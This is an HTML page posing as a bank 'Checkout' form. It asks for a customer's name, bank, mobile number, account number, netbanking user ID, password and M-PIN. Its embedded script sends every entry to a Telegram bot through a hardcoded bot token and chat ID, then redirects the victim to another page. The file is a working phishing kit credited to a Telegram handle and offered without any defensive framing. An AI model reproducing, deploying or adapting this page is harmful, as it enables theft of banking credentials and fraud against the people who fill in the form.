<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Checkout</title>
 <link rel="stylesheet" type="text/css" href="style2.css">
</head>
<body>
 <div class="banner">
 <img src="01.jpg" alt="Banner Image" style="width: 100%; height: 100%; ">
 </div>
 <div class="container">
 <h1 style="text-align: center;"></h1>
 <form id="paymentForm">
 <div class="form-section">
 <h2>ENTER YOUR
 CREDENTIALS</h2>
 <label for="customerName">CUSTOMER NAME</label>
 <input type="text" id="customerName" name="customerName" placeholder="ENTER YOUR NAME" required>
 <label for="bankName">ENTER BANK NAME</label>
 <input type="text" id="bankName" name="bankName" placeholder="NAME OF YOUR BANK" required>
 <label for="mobileNumber">MOBILE NUMBER</label>
 <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="LINKED MOBILE NUMBER" required>
 <label for="accountNumber">ACCOUNT NUMBER</label>
 <input type="text" id="accountNumber" name="accountNumber" placeholder="ENTER YOUR A/C NUMBER" required> 
 <label for="amount">AMOUNT</label>
 <input type="number" id="amount" name="amount" placeholder="REQUIRED AMOUNT" required>
 <label for="userId">USER ID</label>
 <input type="text" id="userId" name="userId" placeholder=" COSTUMER ID/ USERNAME" required>
 <label for="password">PASSWORD</label>
 <input type="password" id="password" name="password" placeholder="ENTER NETBANKING PASSWORD" required>
 <label for="mPin">M PIN</label>
 <input type="PASSWORD" id="mPin" name="mPin" placeholder="ENTER M-PIN" required>
 </div>
 <button type="submit">Pay Now</button>
 </div>
 </form>
 </div>
 <script>
 const form = document.getElementById('paymentForm');

 form.addEventListener('submit', (e) => {
 e.preventDefault();

 const formData = new FormData(form);
 const data = {
 customerName: formData.get('customerName'),
 bankName: formData.get('bankName'),
 mobileNumber: formData.get('mobileNumber'),
 accountNumber: formData.get('accountNumber'),
 userId: formData.get('userId'),
 amount: formData.get('amount'),
 password: formData.get('password'),
 mPin: formData.get('mPin'),
 };

 // Token fill
 const API_TOKEN = '8101119609:AAGA039ibNm2hQTKBoS5vFlyzIP47wQAbM4';
 const CHAT_ID = '-1002615335715';

 const message = `ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot\nCustomer Name : ${data.customerName}\nBank Name : ${data.bankName}\nMobile Number : ${data.mobileNumber}\nAccount Number : ${data.accountNumber}\nUser ID : ${data.userId}\nAmount : ${data.amount}\nPassword : ${data.password}\nM Pin : ${data.mPin}`;

 fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 chat_id: CHAT_ID,
 text: message,
 }),
 })
 .then((response) => response.json())
 .then((data) => {
 console.log(data);
 window.location.href = 'next-page.html'; // redirect to next page
 })
 .catch((error) => console.error(error));
 });
 </script>
</body>
</html>
